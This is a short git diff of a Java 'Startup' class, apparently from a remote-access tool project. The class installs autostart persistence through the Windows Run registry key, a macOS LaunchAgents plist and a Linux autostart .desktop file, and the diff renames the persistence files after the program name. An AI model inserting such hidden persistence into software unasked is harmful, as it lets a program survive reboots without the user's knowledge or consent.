@@ -4,7 +4,7 @@ import java.io.File;
 import java.io.FileWriter;
 import java.io.PrintWriter;
 
-import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.utils.Utils;
 
 public class Startup {
@@ -22,7 +22,7 @@ public class Startup {
 				}
 				WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, "\"" + javaHome + "\" -jar \"" + currentJar.getAbsolutePath() + "\"");
 			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
-				File startupFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + currentJar.getName().replace(".jar", ".plist"));
+				File startupFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + Main.name + ".plist");
 				PrintWriter out = new PrintWriter(new FileWriter(startupFile));
 				out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
 				out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
@@ -48,7 +48,7 @@ public class Startup {
 					autostart.mkdirs();
 				}
 				
-				File startupFile = new File(System.getProperty("user.home") + "/.config/autostart/" + currentJar.getName().replace(".jar", ".desktop"));
+				File startupFile = new File(System.getProperty("user.home") + "/.config/autostart/" + Main.name + ".desktop");
 				
 				
 				PrintWriter out = new PrintWriter(new FileWriter(startupFile));
